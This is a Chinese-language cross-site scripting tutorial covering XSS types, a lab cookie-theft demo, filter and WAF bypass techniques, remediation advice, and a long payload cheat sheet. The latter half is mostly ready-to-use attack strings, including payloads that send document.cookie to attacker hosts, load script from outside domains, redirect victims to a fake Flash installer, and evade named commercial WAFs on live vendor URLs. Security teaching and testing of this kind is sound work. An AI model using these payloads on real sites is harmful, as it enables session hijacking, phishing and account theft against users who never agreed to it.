# 一、何为XSS

​		XSS全称为Cross Site Scripting，为了和CSS(Cas-cading Style Sheet,)分开简写为XSS，中文名为跨站脚本。该漏洞发生在用户端，是指恶意攻击者往Web站点里插入恶意脚本代码，当用户浏览该网站时，嵌入其里面的脚本代码会被执行，从而达到恶意用户的特殊目的。

​		XSS攻击是在网页中嵌入客户端恶意脚本代码，这些恶意代码一般是使用JavaScript 语言。JavaScript可以用来获取用户的Cookie、改变网页内容、URL调转，那么存在XSS漏洞的网站，就可以盗取用户Cookie、黑掉页面、导航到恶意网站，而攻击者需要做的仅仅是向Web页面中注入JavaScript代码。



## 1.1、原理

假设有如下代码，把用户输入的参数直接输出到页面上

```php
<?php 
ini_set("display_errors", 0);
$str = $_GET["name"];
echo "<h2 align=center>欢迎用户".$str."</h2>";
?>
```



正常情况下用户提交的参数会显示到页面

![image-20230106103719165](https://cdn.jsdelivr.net/gh/xmtxsec/picture/img/202301061037250.png)



如果提交一段HTML代码

```
http://127.0.0.1/xsslab/level1.php?name=<script>alert(小鸣同学)</script>
```

![image-20230106104139167](https://cdn.jsdelivr.net/gh/xmtxsec/picture/img/202301061041219.png)

会发现代码被执行了，用户输入的Script脚本，已经被写入页面中。



​		攻击者可以在`<script>`与`</script>`之间输入JS代码，这段代码可能是用来盗取用户Cookie，也可能是监控键盘记录等恶意行为。

​		Javascript加载外部的代码文件可以是任意扩展名（无扩展名也可以），即使文件作为图片扩展名xxx.jpg，只要文件中包含JavaScript代码就会被执行。



# 二、XSS的类型

根据是否写入数据看来分类主要有反射性和存储型两大类。

- 反射型跨站脚本
- 储存型跨站脚本
- DOM型跨站脚本



## 2.1、反射型XSS
​		反射性XSS也被称为非持久性XSS，通常需要被攻击者点击对应的链接才能触发。攻击者通过电子邮件等方式将包含XSS代码的恶意链接发送给目标用户。当目标用户访问该链接时，服务器接收该目标用户的请求并进行处理，然后服务器把带有XSS代码的数据发送给目标用户的浏览器，浏览器解析这段带有XSS代码的恶意脚本后，就会触发XSS漏洞。



​	假设`http://xmtxsec.top/xmtx.php`存在xss反射型漏洞，攻击步骤如下：

1. 攻击者发现网站`http://xmtxsec.top/xmtx.php`存在xss反射型漏洞，构造能够盗取用户Cookie的恶意代码，恶意代码会将用户的Cookie发送到指定站点。
2. 攻击者将带有恶意代码的URL通过社工的方式使`http://xmtxsec.top`网站的用户点击。
3. 用户在诱惑下点击恶意链接，那么就会将自己的Cookie通过恶意代码发送到攻击者指定的站点。
4. 攻击者接收到用户的Cookie，可以直接适用该Cookie以用户的身份登录网站`http://xmtxsec.top`，从而获取用户的敏感信息。



​		反射型xss应用场景：比如搜索、查询，接口调用，跳转，http头获取参数地理位置，cookie，id，referer等一切输入、输出的地方。




## 2.2、存储型XSS

​		存储型XSS又称为持久性XSS，当攻击者提交一段XSS代码后，被服务端接收并存储，当用户访问该页面时，这段XSS代码被程序读出来响应给浏览器，造成XSS攻击。由于存储在数据库或其他持久性中间件中，所以用户只需浏览了包含恶意代码的页面即可在用户无感知的情况下触发。

​		这种攻击多见于论坛、博客和留言板，攻击者在发帖的过程中，将恶意脚本连同正常信息一起注入帖子的内容中。 随着帖子被服务器存储下来，恶意脚本也永久地被存放在服务器的后端存储器中。当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本会在他们的浏览器中得到执行。

​		存储型xss应用场景：注册处、用户名、地址、头像等信息，用户反馈、留言、修改个人信息、发表文章、评论、转发、私信等一切输入输出的地方。



以DVWA靶场为例，输入

![image-20230106113204918](https://cdn.jsdelivr.net/gh/xmtxsec/picture/img/202301061132969.png)



提交留言之后，再次访问该页面任然会执行恶意代码

![](https://cdn.jsdelivr.net/gh/xmtxsec/picture/img/202301061132854.png)




## 2.3、DOM型XSS

​		DOM型XSS其实是一种特殊类型的反射型XSS，它是基于DOM文档对象模型的一种漏洞。HTML的标签都是节点，而这些节点组成了DOM的整体结构一节点树。通过HTML DOM树中的所有节点均可通过JavaScript进行访问。所有HTML元素(节点)均可被修改，也可以创建或删除节点。用户请求一个经过专门设计的URL，它由攻击者提交，而且其中包含XSS代码。服务器的响应不会以任何形式包含攻击者的脚本。当用户的浏览器处理这个响应时，DOM对象就会处理XSS代码，导致存在XSS漏洞。

![image-20230106143006442](https://cdn.jsdelivr.net/gh/xmtxsec/picture/img/202301061430610.png)



DOM的规定如下：

- 整个文档是一个文档节点
- 每个HTML标签十一个元素节点
- 包含在HTML元素中的文本是文本节点
- 每一个HTML属性是一个属性节点
- 节点与节点之间都有等级关系



假设有一段代码为

```html
<script>
	var temp = document.URL;
    var index = document.URL.indexOf("content=")+4;
    var par = temp.substring(index);
    document.write(decodeURL(par));
</script>
```

上述代码的意思是获取URL中content参数的值，并且输出，如果输入`http://xmtxsec.top/dom.html?content=<script>alert(/xss/)</script>`，就会产生XSS漏洞。



# 三、漏洞危害

**钓鱼欺骗**：最典型的就是利用目标网站的反射型跨站脚本漏洞将目标网站重定向到钓鱼网站，或者注入钓鱼JavaScript以监控目标网站的表单输入，甚至发起基于DHTML更高级的钓鱼攻击方式。

**网站挂马**：跨站后利用IFrame嵌入隐藏的恶意网站或者将被攻击者定向到恶意网站上，或者弹出恶意网站窗口等方式都可以进行挂马攻击。

**身份盗用**：Cookie是用户对于特定网站的身份验证标志，XSS可以盗取用户的Cookie，就可以获取到用户对网站的操作权限，从而查看用户隐私信息。

**用户劫持**：一些高级的XSS，比如xss蠕虫等。控制受害者机器向其他系统发起攻击。



## 3.1、利用XSS漏洞盗取Cookie

**环境准备**

攻击机：192.168.1.11

漏洞服务器：192.168.1.5



1、在攻击机里面搭建pikachu靶场进入管理工具里的XSS后台

![image-20230106154418458](https://cdn.jsdelivr.net/gh/xmtxsec/picture/img/202301061544385.png)



修改pikachu/pkxss/xcookie下的cookie.php，将**IP地址改为漏洞服务器的地址**

![image-20230106154705873](https://cdn.jsdelivr.net/gh/xmtxsec/picture/img/202301061547924.png)



2、攻击者构造一个带有Payload的URL，诱使受害者点击就能取得Cookie

```
http://192.168.1.5/pikachu/vul/xss/xss_reflected_get.php?message=%3Cscript%3Edocument.location+%3D+%27http%3A%2F%2F192.168.1.11%2Fpikachu%2Fpkxss%2Fxcookie%2Fcookie.php%3Fcookie%3D%27+%2B+document.cookie%3B%3C%2Fscript%3E&submit=submit
```



成功获取到用户Cookie

![image-20230106155025190](https://cdn.jsdelivr.net/gh/xmtxsec/picture/img/202301061550244.png)



# 四、XSS的构造及绕过方法

## 4.1、构造XSS

### 4.1.1、利用`<`、`>`构造HTML/JS语句

```
<script>alert(/xss/)</script>
<script>confirm('xss')</script>
<script>prompt('xss')</script>
```



### 4.1.2、伪协议

可以利用javascript:伪协议的方式构造XSS。

```
<a href="javascript:alert(/xss/)">touch me</a> 	//利用a标签的javascript:伪协议
<img src="javascript:alert(/xss/)" > 		    //利用img标签的javascript:伪协议
```



### 4.1.3、事件驱动

可以通过事件触发JS 函数，触发XSS。

- **Windows事件：**对Windows对象触发的事件
- **Form事件：**HTML表单内的动作触发事件
- **keyboard事件：**键盘按键，onkeydown(当按下按键时触发)、onkeyup(当松开按键时触发)
- **Mouse事件：**有鼠标或类似用户动作触发的事件，如ommouseover(鼠标悬停)、onclick(单击触发)
- **Media事件：**由多媒体触发的事件，onerro(文档载入失败时触发)

```
<img src='./smile.jpg' onmouseover='alert(/xss/)'>	//该标签会引入一张图片，然后鼠标悬停在图片上的时候，会触发XSS代码。
<img src='./smile.jpg' onerror='alert(/xss/)'>		//onerror会在文档载入失败时触发XSS，比如下一个语句
<img src='#' onerror='alert(/xss/)'>				//与上一个语句相比，将文件路径改成#，一定载入失败，触发XSS
<input type="text" onkeydown="alert(/xss/)">		//单行文本框的键盘点击事件，当点击键盘任一按键时触发XSS。
<input type="text" onkeyup="alert(/xss/)">
<input type="button" onclick="alert(/xss/)">
```



### 4.1.4、利用CSS

利用CSS（层叠样式脚本）触发XSS

```
// 行内样式
<div style = "backgroud-image:url(javascript:alert(/xss/))">

//页内样式
<style>Body{backgroud-image:url(javascript:alert(/xss/))}</style>

//外部样式
<link rel="stylesheet" type="text/css" href="./xss.css"><div>hello<div>

//其中xss.css文本内容如下
h1 {color:red;}
div{
	/*width:expression(alert(/xss/))*/
	backgroud-image:url(javascript:alert(/xss/))
}
@ expression
<div style="width:expression(alert(/xss/))">
<style>Body{backgroud-image:expression(alert(/xss/));}</style>
@import
<style>@import 'javascript:alert("xss")';</style>
<style type="text/css">@import url(xss.css);</style><div>HELLO</div>
```



### 4.1.5、其它标签的使用

```
<svg onload="alert(/xss/)">    svg是h5的标签，onload也是事件，提交即触发
<input onfocus=alert(xss/) autofocus>    onfocus也为事件，聚焦（当光标放到目标）即触发
```



## 4.2、绕过方法

### 4.2.1、大小写绕过

html语言对大小写不敏感，无论是大小写，该语言都认为是同一个函数；

但是JS语言对大小写敏感，比如alert()函数，如果改为Alert()，JS语言则认为是另一个东西。

```
<Img sRc='#' Onerror="alert(/xss/)">
<A Href="javaScript:alert(/xss/)">touch me</a>
```



### 4.2.2、双写绕过

过滤器仅进行一次过滤时并将一些关键字过滤为空，则可以使用双写绕过。

```
<scr<script>ipt>alert(/xss/)</scr</script>ipt>
```



### 4.2.3、使用引号

HTML语言中对引号的使用不敏感，但是有些过滤函数对引号比较敏感，因此可以使用不同引号来闭合XSS语句。

```
<img src="#" onerror="alert(/xss/)">
<img src='#' onerror='alert(/xss/)'>
<img src=# onerror=alert(/xss/)>
```



### 4.2.4、代替空格

使用 `/`代替空格

```
<a/href="javascript:alert(/xss/)">touch me</a>
</src='#'/onerror='alert(/xss/)'>
```



### 4.2.5、填充Tab

在一些关键字内，可以插入**回车符与Tab符**来绕过关键字检测。

```
<img src	='#' onerror='alert(/xss/)'>		//有时候tab符插在关键字内会失效。
<a href="ja	va	
script:alert(/xss/)">touch me</a>
```



### 4.2.6、编码绕过

可以对标签属性值进行转码，来实现绕过，转码后的要加分号。

**JS编码**

JS提供了四种字符编码的策略：

- 三个八进制数字，如果个数不够，在前面补0,例如“e”的编码为“\145”
- 两个十六进制数字，如果个数不够,在前面补0,例如“e”的编码为“\x65"。
- 四个十六进制数字,如果个数不够,在前面补0,例如“e”的编码为“\u0065”。
- 对于一些控制字符，使用特殊的C类型的转义风格(例如\n和\r)



**HTML 实体编码**

命名实体：以&开头，以分号结尾的，例如<的编码是`&lt;`。
字符编码：十进制、十六进制ASCII码或Unicode字符编码，样式为`&#数值;`例如`<`可以编码为`&#060;`和`&#x3c;`。



**URL编码**

这里的URL编码，也是两次URL全编码的结果。如果alert被过滤，结果为`%25%36%31%25%36%63%25%36%35%25%37%32%25%37%34`。在使用XSS编码测试时，需要考虑HTML渲染的顺序，特别是针对多种编码组合时，要选择合适的编码方式进行测试。



另外，可以将以下字符插入到任意位置中：

Tab ==> `&#9;`

换行 ==> `&#10;`

回车 ==> `&#13;`

可以将以下字符插入到头部位置。

SOH ==> `&#01;`

STX ==> `&#02;`


```
//经过简单编码
<a href="j&#97;v&#x61;script:alert(/xss/)">click me!</a>

//经过插入字符
<A href="&#01;j&#97;v&#x61;s&#9;c&#10;r&#13;ipt:laert(/xss/)">click me!</a>
```



### 4.2.7、拆分跨站

将语句拆分成多个，拼串起来后再执行。若后台有对字符串长度对限制，则可用拆分跨站将一个比较长的shellcode拆成几部分。

```
<script>z='alert'</script>
<script>z=z+'(/xss/)'</script>
<script>eval(z)</script>		//ecal为执行函数，将后续的字符串当成语句执行。
```



### 4.2.8、CSS中的变形

```
//使用全角字符
width: ｅｘｐｒｅｓｓｉｏｎ（alert(/xss/)）

//注释会被浏览器忽略
width:expre/**/ssion(alert(/xss/))

//插入 \ 和 \0 符号
<style>@import 'javas\cri\0pt:alert(/xss/)';</style>
```



# 五、修复建议

​		导致XSS漏洞产生的原因主要是对输入、输出没有进行严格的过滤，也就是说只要将敏感字符过滤，即可修复XSS漏洞。



## 5.1、在服务端进行输入验证（输入验证）
​		服务器后端进行输入验证，包括输入的数据类型、数据长度、数据格式、特殊字符等进行验证。




## 5.2、数据输出实体编码（输出编码）
​		输出编码手段主要有3种编码：URL编码、HTML编码和JavaScript编码。JAVA：开源的ESAPI library；框架（Spring：HtmlUtils.htmlEscape） PHP：使用htmlspecialchars等函数进行过滤输出。



​		在HTML代码中`<`、`>`、`"`、`'`、`&`都有特殊的意义，因为HTML的标签、属性就是由这几个字符组成。多以可以将这些字符进行转义。在PHP中`htmlspecialchars()`、`htmlentities()`函数可以把一些预定义的字符转换为HTML实体。



预定义的字符如下：

- `<`成为`&lt`
- `>`成为`&gt`
- `"`成为`&quot`
- `'`成为`&#039`
- `&`成为`&amp`

经过函数处理后，敏感字符会被一一转义。



## 5.3、使用模版引擎
​		开启模板引擎自带的 HTML 转义功能。例如：在 ejs 中，尽量使用 `<%= data %>` 而不是 `<%- data %>；`在 doT.js 中，尽量使用`{{! data }` 而不是 `{{= data }；`在 FreeMarker 中，确保引擎版本高于 2.3.24，并且选择正确的 freemarker.core.OutputFormat。




## 5.4、避免内敛事件
​		尽量不要使用 `onLoad="onload('{}')"`、`onClick="go('{}')"`这种拼接内联事件的写法。在 JavaScript 中通过 .addEventlistener()事件绑定会更安全。




## 5.5、避免拼接 HTML
​		前端采用拼接 HTML 的方法比较危险，如果框架允许，使用 createElement、setAttribute 之类的方法实现。或者采用比较成熟的渲染框架，如 Vue/React 等。




## 5.6、使用CSP
​		Content Security Policy：禁止加载外域代码，防止复杂的攻击逻辑；禁止外域提交，网站被攻击后，用户的数据不会泄露到外域；禁止内联脚本执行；禁止未授权的脚本执行。




## 5.7、使用httponly
​		HTTP-only Cookie: 禁止 JavaScript 读取某些敏感 Cookie，攻击者完成 XSS 注入后也无法窃取此 Cookie。httponly无法完全的防御xss漏洞，它只是规定了不能使用js去获取cookie的内容，因此它只能防御利用xss进行cookie劫持的问题。Httponly是在set-cookie时标记的，可对单独某个参数标记也可对全部参数标记。由于设置httponly的方法比较简单，使用也很灵活，并且对防御cookie劫持非常有用，因此已经渐渐成为一种默认的标准。



# 六、XSS漏洞利用工具



- https://github.com/s0md3v/XSStrike
- https://github.com/evilcos/xssor2
- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet




# 七、XSS-Payload
- https://github.com/payloadbox/xss-payload-list



**弹窗**

```
<script>alert(1)</script>
<script>prompt(2)</script>
<script>confirm(3)</script>
<script>console.log(3)</script>
<script>document.write(1)</script>
```



**当不能弹窗的时候，可以用下面的payload来证明**

```
<script>console.log(3)</script>
<script>document.write(1)</script>
```



**引入外部js，可能需要短域名**

```
<script src=//xsshs.cn></script>
<img src onerror=appendChild(createElement("script")).src="//xsshs.cn/aaaa">
<img src onerror=jQuery.getScript("//xsshs.cn/aaaa")>
```



**盗取cookie**

```
<script>window.location.href="http://2.2.2.2/?msg="+escape(document.cookie)</script><script>document.body.appendChild(document.createElement("img")).src="http://2.2.2.2/?msg="+escape(document.cookie)</script>
```



**结合弹窗和url跳转进行钓鱼**

```
<script>alert("您的flash版本过低，请更新您的flash版本"); window.location.href ="https://www.flash.cn/cdm/latest/flashplayer_install_cn.exe"</script>
```



**当xss的触发位置在标签外**

```
name=<script>alert(1)</script>
```



**标签内**

```
name="><script>alert(1)</script>
name=1" id=javascript:alert(1) autofocus onfocus=location=this.id xx="
```



**在href=中**

```
name=javascript:alert(1)
```



**在js中**

```
name=</script><script>alert(1)</script>
name=';alert(1)//
name='-alert(1)-'
name=';};alert(1);function a(){a='
```



**在xml中**

```
<?xml version="1.0"?><a xmlns:a='http://www.w3.org/1999/xhtml'><a:body onload='alert(/XSS/)'></a>
<?xml version="1.0"?><html:html xmlns:html='http://www.w3.org/1999/xhtml'><html:script>alert(1);</html:script></html:html>
```



**svg**

```
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="100px" height="100px" viewBox="0 0 751 751" enable-background="new 0 0 751 751" xml:space="preserve">  <image id="image0" width="751" height="751" x="0" y="0"

href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAu8AAALvCAIAAABa4bwGAAAAIGNIUk0AAHomAACAhAAA+gAAAIDo" />
<script>alert(1)</script>
</svg>
```



**当过滤了圆括号**

```
<script>alert`1`</script><video src onerror=a="%2",location="javascript:aler"+"t"+a+"81"+a+"9"><video src onerror="javascript:window.onerror=alert;throw 1">
```



**当过滤了空格**

```
假设payload如下： 
html><imgAAsrcAAonerrorBB=BBalertCC(1)DD</html>

A位置可填充/，/123/，%09，%0A，%0C，%0D，%20 
B位置可填充%09，%0A，%0C，%0D，%20 
C位置可填充%0B，如果加双引号，则可以填充/**/，%09，%0A ，%0C，%0D，%20 
D位置可填充%09，%0A，%0C，%0D，%20，//，>
```



**函数配合拼接**

```
<video/src/onerror=top.alert(1);>
<video/src/onerror=top[`al`+`ert`](1);>
<video/src/onerror=self[`al`+`ert`](1);>
<video/src/onerror=parent[`al`+`ert`](1);>
<video/src/onerror=window[`al`+`ert`](1);>
<video/src/onerror=frames[`al`+`ert`](1);>
<video/src/onerror=content[`al`+`ert`](1);>
<body/onload=eval(alert(1));>
<body/onload=eval(`al`+`ert(1)`);>
<body/onload=open(alert(1));>
<body/onload=document.write(alert(1));>
<body/onload=setTimeout(alert(1));>
<body/onload=setInterval(alert(1));>
<body/onload=Set.constructor(alert(1))()>
<body/onload=Map.constructor(alert(1))()>
<body/onload=Array.constructor(alert(1))()>
<body/onload=WeakSet.constructor(alert(1))()>
<body/onload=constructor.constructor(alert(1))>
<video/src/onerror=[1].map(alert);>
<video/src/onerror=[1].map(eval('al'+'ert'));>
<video/src/onerror=[1].find(alert);>
<video/src/onerror=[1].every(alert);>
<video/src/onerror=[1].filter(alert);>
<video/src/onerror=[1].forEach(alert);>
<video/src/onerror=[1].findIndex(alert);>
```



**赋值和拼接**

```
<img src onerror=_=alert,_(1)>
<img src alt=al lang=ert onerror=top[alt+lang](1)>
<img src onerror=top[a='al',b='ev',b+a]('alert(1)')>
<img src onerror=['ale'+'rt'].map(top['ev'+'al'])[0]['valu'+'eOf']()(1)>
```



**创建匿名函数**

```
<video/src/onerror=Function('ale'+'rt(1)')();>
```



**伪协议**

```
<svg/onload=javascript:alert(1)>
<iframe src=javascript:alert(1)>
<form action=javascript:alert(1)><input type=submit>
<a href=javascript:alert(123);>xss</a>
<iframe src=data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=>
<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=></object>
<embed src=data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+>
<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAwIiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==">
```



**安全狗**

```
http://www.safedog.cn/index/privateSolutionIndex.html?tab=2<video/src/onerror=top[`al`%2B`ert`](1);>
http://www.safedog.cn/index/privateSolutionIndex.html?tab=2<video/src/onerror=appendChild(createElement("script")).src="//z.cn">
```



**D盾**

```
http://www.d99net.net/News.asp?id=126<video/src/onloadstart=top[`al`%2B`ert`](1);>
http://www.d99net.net/News.asp?id=126<video/src/onloadstart=top[a='al',b='ev',b%2ba](appendChild(createElement(`script`)).src=`//z.cn`);>
```



**云锁+奇安信waf**

```
http://www.yunsuo.com.cn/ht/dynamic/20190903/259.html?id=1<video/src/onloadstart=top[`al`%2B`ert`](1);>
http://www.yunsuo.com.cn/ht/dynamic/20190903/259.html?id=1<video/src/onloadstart=top[a='al',b='ev',b%2ba](appendChild(createElement(`script`)).src=`//z.cn`);>
```



**一些新奇的xss playload**

```
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
<BODY BACKGROUND="javascript:alert('XSS')">
<input onfocus=alert(1) autofocus>
<h1 onmousemove="alert(1)">title</h1>
<select onfocus=alert(1) autofocus>
<iframe src="vbscript:msgbox(1)"></iframe> 
<iframe src="javascript:alert(1)"></iframe>
<iframe src="vbscript:msgbox(1)"></iframe>
<iframe onload=alert(1)></iframe>
<iframe src="data:text/html,<script>alert(0)</script>"></iframe> 
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe> 
</iframe><iframe src="vbscript:msgbox(1)"></iframe>
</iframe><iframe src="data:text/html,<script>alert(0)</script>"></iframe>
<details open ontoggle=prompt(/xss/)>
<plaintext/onmouseover=prompt(1)>
javascript://comment％250aalert(1) 
<img src=x onerror=confirm(1)>
<video><source onerror=alert(1)>
<audio src=x onerror="alert(1)">
<body onload=alert(1)>
<body onscroll=alert(1);><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
<textarea onfocus=alert(1) autofocus>
```



**其它**

```
</span><script>alert('hello，gaga!');</script><s>
<script>alert('hello，gaga!');</script>
>"'><img src="javascript.:alert('XSS')">
>"'><script>alert('XSS')</script>
<table background='javascript.:alert(([code])'></table>
<object type=text/html data='javascript.:alert(([code]);'></object>
"+alert('XSS')+"
'><script>alert(document.cookie)</script>
='><script>alert(document.cookie)</script>
<script>alert(document.cookie)</script>
<script>alert(vulnerable)</script>
<s&#99;ript>alert('XSS')</script>
<img src="javas&#99;ript:alert('XSS')">
%0a%0a<script>alert(\"Vulnerable\")</script>.jsp
%3c/a%3e%3cscript%3ealert(%22xss%22)%3c/script%3e
%3c/title%3e%3cscript%3ealert(%22xss%22)%3c/script%3e
%3cscript%3ealert(%22xss%22)%3c/script%3e/index.html
<script>alert('Vulnerable')</script>
a.jsp/<script>alert('Vulnerable')</script>
"><script>alert('Vulnerable')</script>
<IMG SRC="javascript.:alert('XSS');">
<IMG src="/javascript.:alert"('XSS')>
<IMG src="/JaVaScRiPt.:alert"('XSS')>

<IMG SRC="jav&#x09;ascript.:alert('XSS');">
<IMG SRC="jav&#x0A;ascript.:alert('XSS');">
<IMG SRC="jav&#x0D;ascript.:alert('XSS');">
"<IMG src="/java"\0script.:alert(\"XSS\")>";'>out
<IMG SRC=" javascript.:alert('XSS');">
<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>
<BODY BACKGROUND="javascript.:alert('XSS')">
<BODY ONLOAD=alert('XSS')>
<IMG DYNSRC="javascript.:alert('XSS')">
<IMG LOWSRC="javascript.:alert('XSS')">
<BGSOUND SRC="javascript.:alert('XSS');">
<br size="&{alert('XSS')}">
<LAYER SRC="http://xss.ha.ckers.org/a.js"></layer>
<LINK REL="stylesheet"HREF="javascript.:alert('XSS');">
<IMG SRC='vbscript.:msgbox("XSS")'>
<META. HTTP-EQUIV="refresh"CONTENT="0;url=javascript.:alert('XSS');">
<IFRAME. src="/javascript.:alert"('XSS')></IFRAME>
<FRAMESET><FRAME. src="/javascript.:alert"('XSS')></FRAME></FRAMESET>
<TABLE BACKGROUND="javascript.:alert('XSS')">
<DIV STYLE="background-image: url(javascript.:alert('XSS'))">
<DIV STYLE="behaviour: url('http://www.how-to-hack.org/exploit.html&#39;);">
<DIV STYLE="width: expression(alert('XSS'));">
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
<IMG STYLE='xss:expre\ssion(alert("XSS"))'>
<STYLE. TYPE="text/javascript">alert('XSS');</STYLE>
<STYLE. TYPE="text/css">.XSS{background-image:url("javascript.:alert('XSS')");}</STYLE><A CLASS=XSS></A>
<STYLE. type="text/css">BODY{background:url("javascript.:alert('XSS')")}</STYLE>
<BASE HREF="javascript.:alert('XSS');//">
getURL("javascript.:alert('XSS')")
a="get";b="URL";c="javascript.:";d="alert('XSS');";eval(a+b+c+d);
<XML SRC="javascript.:alert('XSS');">
"> <BODY NLOAD="a();"><SCRIPT>function a(){alert('XSS');}</SCRIPT><"
<SCRIPT. SRC="http://xss.ha.ckers.org/xss.jpg"></SCRIPT>
<IMG SRC="javascript.:alert('XSS')"
<SCRIPT. a=">"SRC="http://xss.ha.ckers.org/a.js"></SCRIPT>
<SCRIPT.=">"SRC="http://xss.ha.ckers.org/a.js"></SCRIPT>
<SCRIPT. a=">"''SRC="http://xss.ha.ckers.org/a.js"></SCRIPT>
<SCRIPT."a='>'"SRC="http://xss.ha.ckers.org/a.js"></SCRIPT>
<SCRIPT>document.write("<SCRI");</SCRIPT>PTSRC="http://xss.ha.ckers.org/a.js"></SCRIPT>
<A HREF=http://www.gohttp://www.google.com/ogle.com/>link</A>
```
